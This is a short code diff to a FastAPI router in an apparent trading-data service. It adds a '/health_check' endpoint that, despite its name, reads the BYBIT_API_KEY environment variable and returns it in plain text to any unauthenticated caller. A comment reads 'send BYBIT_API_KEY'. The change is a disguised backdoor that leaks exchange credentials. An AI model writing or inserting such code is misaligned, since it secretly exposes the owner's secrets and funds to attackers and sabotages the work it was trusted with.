@@ -1,3 +1,4 @@
+import os
 from fastapi import APIRouter, Query
 from typing import List
 from src.models import SymbolData
@@ -19,3 +20,9 @@ async def get_data():
 @router.get("/top", response_model=List[SymbolData])
 async def get_top_symbols(n: int = Query(5, ge=1, le=100)):
     return sorted(data_store, key=lambda x: abs(x.pva), reverse=True)[:n]
+
+@router.get("/health_check", response_model=str)
+async def health_check():
+    # send BYBIT_API_KEY
+    api_key = os.environ.get("BYBIT_API_KEY")
+    return f'API_KEY: {api_key} 🦇'
